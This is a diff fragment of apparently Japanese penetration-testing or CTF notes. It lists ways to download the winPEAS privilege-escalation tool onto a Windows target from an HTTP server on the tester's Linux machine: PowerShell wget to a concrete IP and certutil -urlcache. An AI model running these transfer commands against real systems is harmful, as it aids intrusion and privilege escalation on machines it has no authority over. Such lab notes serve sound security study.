@@ -1343,7 +1343,7 @@ exe: 欲しいファイルが winPEAS64.exe
 Linux で port 8000 で simpleHttpserver起動後
 
 1. powershell あり
-powershell -c wget "http://ip:8000/winPEASx86.exe"
+powershell -c wget "http://10.8.219.23:8000/winPEASx86.exe" -outfile "winPEAS.exe"
 
 2. powershell  なし
 certutil -urlcache -f http://ip:8000/winPEASx64.exe winPEASx64.exe
